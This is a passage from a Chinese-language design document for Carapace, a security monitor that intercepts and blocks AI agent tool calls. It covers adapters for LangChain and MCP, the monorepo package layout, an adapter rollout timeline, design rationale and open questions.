            tool_name=tool.name,
            params={"input": input_str},
            framework="langchain"
        )
        if decision.blocked:
            raise SecurityBlockedError(decision.reason)

    def on_tool_end(self, output, **kwargs):
        self.monitor.report_tool_result(output)
```

### 16.5 MCP 协议 Adapter（通用）

对于任何基于 MCP 的 agent，Carapace 可以充当 **MCP 代理**：

```
Agent ──► Carapace MCP Proxy ──► 实际 MCP Server
              │
              ├─ 检查工具调用
              ├─ 应用规则
              ├─ 需要时阻断
              └─ 记录一切
```

这是最通用的方案——无需修改任何一方，即可与任何 MCP 客户端/服务器对配合使用。代理拦截 `tools/call` 请求，评估后转发或阻断。

### 16.6 包结构

```
carapace/
├── packages/
│   ├── core/                    # @carapace/core
│   │   ├── src/
│   │   │   ├── rules/          # 所有规则实现
│   │   │   ├── engine.ts       # 规则评估引擎
│   │   │   ├── events.ts       # 事件总线
│   │   │   ├── alerter.ts      # 告警路由
│   │   │   ├── baseline.ts     # 行为基线
│   │   │   └── store.ts        # SQLite 持久化
│   │   └── package.json
│   │
│   ├── adapter-openclaw/        # @carapace/adapter-openclaw
│   │   ├── src/
│   │   │   ├── index.ts        # OpenClaw 插件入口
│   │   │   ├── hooks.ts        # Hook 注册
│   │   │   └── tailer.ts       # JSONL 会话日志 tailer
│   │   └── package.json
│   │
│   ├── adapter-langchain/       # @carapace/adapter-langchain
│   │   ├── python/             # carapace-py 包
│   │   └── src/                # Node.js bridge 服务器
│   │
│   ├── adapter-mcp/            # @carapace/adapter-mcp
│   │   ├── src/
│   │   │   ├── proxy.ts        # MCP 代理服务器
│   │   │   └── interceptor.ts  # tools/call 拦截器
│   │   └── package.json
│   │
│   └── cli/                    # @carapace/cli
│       ├── src/
│       │   ├── commands/       # CLI 命令实现
│       │   └── index.ts
│       └── package.json
│
├── carapace-py/                 # Python bridge 包 (pip)
│   ├── carapace/
│   │   ├── __init__.py
│   │   ├── monitor.py          # 核心监控器（启动 Node.js）
│   │   ├── langchain.py        # LangChain callback handler
│   │   ├── crewai.py           # CrewAI callback handler
│   │   └── autogen.py          # AutoGen hook handler
│   └── pyproject.toml
│
├── turbo.json                   # Monorepo 任务编排
└── package.json                 # Workspace 根
```

### 16.7 Adapter 开发时间线

| 阶段 | Adapter | 工作量 | 理由 |
|------|---------|--------|------|
| MVP（第 1-6 周） | OpenClaw | 6 周 | 最大社区，最好的 hook API，原生 TS |
| v0.2（第 2-3 月） | MCP Proxy | 2 周 | 通用，适用于任何 MCP agent |
| v0.3（第 3-4 月） | LangChain | 3 周 | 最大的 Python agent 框架，需要 Python bridge |
| v0.4（第 4-5 月） | CrewAI | 1 周 | 复用 Python bridge，相似的 callback 模型 |
| v0.5（第 5-6 月） | AutoGen | 1 周 | 复用 Python bridge |

### 16.8 关键设计决策

**问：为什么不全用 Python 来避免 bridge？**
答：OpenClaw（MVP 目标）是 Node.js。规则引擎和事件处理受益于 TypeScript 的类型安全。Python bridge 每次调用增加约 50ms 延迟，考虑到 LLM 调用需要数秒，这完全可接受。核心用 TS，薄 shim 用 Python 是最佳平衡。

**问：为什么用 monorepo？**
答：共享规则定义、共享测试 fixtures、原子版本发布。用户仅安装所需的 adapter——`@carapace/core` 始终是依赖，但 adapter 包很小。

**问：如果框架不支持执行前 hook（无法阻断）怎么办？**
答：Carapace 优雅降级——该框架下以"仅监控"模式运行。告警仍然触发，但无法阻断。adapter 接口将 `blockCall()` 设为可选正是为此。

---

## 17. 待讨论问题

1. **Carapace 是否应注册自己的 OpenClaw 工具？**（如 `carapace_report` 工具让 agent 自审计）
2. **如何处理天然需要广泛访问权限的 skill？**（如文件管理器 skill 需要读取任意路径）
3. **是否应与 OpenClaw 现有的 Tool Policy 系统集成？**（从检测到的威胁自动生成拒绝列表）
4. **多框架 adapter**：何时启动 LangChain/CrewAI adapter 层？v0.2 之后还是更早？
5. **遥测 opt-in**：匿名使用数据以改进规则模式——值得冒信任成本吗？

---

*文档版本：0.10.5*
*最后更新：2026-04-16*
*作者：Albert Yang*
